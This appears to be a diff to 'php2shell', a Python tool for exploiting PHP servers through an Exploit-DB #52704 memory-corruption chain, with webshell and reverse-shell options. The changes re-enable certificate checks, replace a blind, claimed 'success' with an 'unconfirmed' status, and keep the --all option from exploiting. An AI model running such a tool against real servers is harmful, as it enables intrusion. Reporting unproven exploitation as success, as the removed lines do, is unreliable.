@@ -50,13 +50,6 @@ from urllib.parse import urljoin, urlparse
 
 import requests
 
-# Disable insecure request warnings
-try:
-    from urllib3.exceptions import InsecureRequestWarning  # type: ignore
-    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)  # type: ignore
-except Exception:
-    pass
-
 # Safe console colors
 try:
     from colorama import Fore, Style, init as colorama_init
@@ -82,7 +75,7 @@ if hasattr(sys.stderr, "reconfigure"):
 
 logger = logging.getLogger("php2shell")
 
-__version__ = "2.2.0"
+__version__ = "2.2.1"
 
 # ---------------------------------------------------------------------------
 # UNIFIED CONSTANTS (Single Source of Truth)
@@ -381,6 +374,7 @@ class ExploitStatus(str, Enum):
     SHELL_SPAWNED = "shell_spawned"
     WEBSHELL_DROPPED = "webshell_dropped"
     VULNERABLE_TRIGGERED = "vulnerable_triggered"
+    UNCONFIRMED = "unconfirmed"
     FAILED = "failed"
     ERROR = "error"
 
@@ -596,8 +590,6 @@ class RawHttpTarget:
                 s = socket.create_connection((self.host, self.port), timeout=self.timeout)
                 if self.https:
                     ctx = ssl.create_default_context()
-                    ctx.check_hostname = False
-                    ctx.verify_mode = ssl.CERT_NONE
                     s = ctx.wrap_socket(s, server_hostname=self.host)
                 try:
                     s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
@@ -811,7 +803,7 @@ class UnifiedPHP2Shell:
         self.verbose = verbose
         self.session = session or requests.Session()
         self.session.headers.update({"User-Agent": f"PHP2Shell/{__version__} (Security Research)"})
-        self.session.verify = False
+        # Leave HTTPS certificate verification enabled by default.
 
     def progress(self, step: str, msg: str, colour: str = Fore.CYAN) -> None:
         ts = datetime.now().strftime("%H:%M:%S")
@@ -977,7 +969,7 @@ class UnifiedPHP2Shell:
         combo = f"{server_hdr} {powered_by}".lower()
         if "fpm" in combo:
             ha.runtime_mode = PHPRuntime.PHP_FPM
-        elif "mod_php" in combo or "apache" in combo:
+        elif "mod_php" in combo or "apache2handler" in combo:
             ha.runtime_mode = PHPRuntime.MOD_PHP
         elif "litespeed" in combo:
             ha.runtime_mode = PHPRuntime.LITESPEED
@@ -1033,19 +1025,41 @@ class UnifiedPHP2Shell:
             vr.version_tuple = parse_php_version(vr.version_string)
             if vr.version_tuple:
                 maj, minor, patch = vr.version_tuple
-                if (maj, minor) < (8, 2):
+                if (maj, minor) < (5, 4):
+                    vr.status = VulnerabilityStatus.UNKNOWN
+                    vr.detail = "Version predates the documented affected range; review manually."
+                elif (maj, minor) < (8, 2):
                     vr.status = VulnerabilityStatus.VULNERABLE_EOL
                     vr.applicable_cves = list(TRACKED_CVES)
-                    vr.detail = f"PHP {vr.version_string} is EOL. Vulnerable to CVE-2026-109618 & 109619."
+                    vr.detail = (
+                        f"PHP {vr.version_string} is an older upstream branch in the affected range. "
+                        "Check vendor security backports before confirming exposure."
+                    )
                 else:
                     patched = PATCHED_VERSIONS.get((maj, minor))
-                    if patched and vr.version_tuple < patched:
+                    if patched is None:
+                        vr.status = VulnerabilityStatus.UNKNOWN
+                        vr.detail = "This PHP branch is not in the maintained version table; review manually."
+                    elif vr.version_tuple < patched:
                         vr.status = VulnerabilityStatus.VULNERABLE
                         vr.applicable_cves = list(TRACKED_CVES)
-                        vr.detail = f"PHP {vr.version_string} < patched {'.'.join(str(x) for x in patched)} (CVE-2026-109618/109619)."
+                        vr.detail = (
+                            f"Upstream PHP {vr.version_string} < fixed {'.'.join(str(x) for x in patched)}. "
+                            "Verify vendor backports before treating header evidence as proof."
+                        )
                     else:
                         vr.status = VulnerabilityStatus.PATCHED
-                        vr.detail = f"PHP {vr.version_string} meets patch criteria."
+                        vr.detail = (
+                            f"PHP {vr.version_string} meets upstream version threshold; "
+                            "confirm the serving runtime and package origin."
+                        )
+
+        # The standalone Python fixture only imitates PHP response headers. It
+        # cannot demonstrate actual PHP memory corruption or patch effectiveness.
+        if resp.headers.get("X-PHP2Shell-Lab", "").lower() == "standalone-fixture":
+            vr.status = VulnerabilityStatus.UNKNOWN
+            vr.applicable_cves = []
+            vr.detail = "Synthetic Python lab fixture: fingerprint-only, not a vulnerability test."
 
         status_col = Fore.RED if vr.status in (VulnerabilityStatus.VULNERABLE, VulnerabilityStatus.VULNERABLE_EOL) else Fore.GREEN
         ver_display = vr.version_string or "Unknown"
@@ -1265,9 +1279,20 @@ class UnifiedPHP2Shell:
             self.progress("  └─ [Exploit-DB #52704]", f"Starting memory corruption chain (profile={profile})...", Fore.YELLOW)
             try:
                 carrier_cmd = cmd.strip()
-                if len(carrier_cmd.encode("latin1")) > MAX_CMD_LEN:
-                    self.progress("  └─ [Exploit-DB #52704]", f"Command exceeds {MAX_CMD_LEN}B carrier; staging short trigger 'id'...", Fore.YELLOW)
-                    carrier_cmd = "id"
+                try:
+                    carrier_bytes = carrier_cmd.encode("latin1")
+                except UnicodeEncodeError:
+                    res.status = ExploitStatus.ERROR
+                    res.details = "Command cannot be represented in the carrier's Latin-1 encoding."
+                    return res
+                if len(carrier_bytes) > MAX_CMD_LEN:
+                    res.status = ExploitStatus.ERROR
+                    res.details = (
+                        f"Command is {len(carrier_bytes)} bytes; this build's carrier supports at most "
+                        f"{MAX_CMD_LEN}. No command was substituted or dispatched."
+                    )
+                    self.progress("  └─ [Exploit-DB #52704]", res.details, Fore.YELLOW)
+                    return res
 
                 raw_tgt = RawHttpTarget(ep, timeout=float(self.timeout), verbose=False)
                 engine_52704 = ExploitDB52704Engine(
@@ -1335,10 +1360,13 @@ class UnifiedPHP2Shell:
 
                             engine_52704.rotate()
 
-                        res.status = ExploitStatus.SUCCESS
-                        res.command_output = f"[Payload '{carrier_cmd}' dispatched to zif_system]"
-                        res.details = "Exploit-DB 52704 payload executed blind without external proof file."
-                        self.progress("  └─ [Exploit-DB #52704]:", "Exploit chain dispatched successfully!", Fore.GREEN)
+                        res.status = ExploitStatus.UNCONFIRMED
+                        res.command_output = None
+                        res.details = (
+                            "Requests were sent, but no independently verified execution evidence "
+                            "was obtained. Do not report this as a confirmed compromise."
+                        )
+                        self.progress("  └─ [Exploit-DB #52704]:", "Dispatch unconfirmed; no proof of execution.", Fore.YELLOW)
                         return res
 
             except Exception as e:
@@ -1640,7 +1668,7 @@ def build_cli() -> argparse.ArgumentParser:
 
     # Pipeline triggers
     p.add_argument("--all", "--full", action="store_true", dest="run_all",
-                   help="Run the complete end-to-end pipeline (Recon -> Passive -> Probes -> WAF -> Exploit)")
+                   help="Run recon, passive fingerprinting, active probes and WAF diagnostics (no exploitation)")
     p.add_argument("--recon", action="store_true", help="Run Stage 1: Reconnaissance")
     p.add_argument("-w", "--wordlist", help="Custom wordlist file with endpoint paths (one per line)")
     p.add_argument("--remote-wordlist", "--fetch-wordlist", action="store_true", dest="fetch_wordlist",
@@ -1706,7 +1734,8 @@ def main() -> int:
     do_recon = args.run_all or args.recon or bool(args.wordlist) or args.fetch_wordlist
     do_active = args.run_all or args.active
     do_waf = args.run_all or args.waf
-    do_exploit = args.run_all or args.exploit or args.shell or bool(args.lhost)
+    # --all is an assessment shortcut, not implicit permission to execute code.
+    do_exploit = args.exploit or args.shell or bool(args.lhost) or args.reverse
     do_shell = args.shell
 
     # Load and merge endpoint wordlist (built-in + optional remote SecLists + user file)
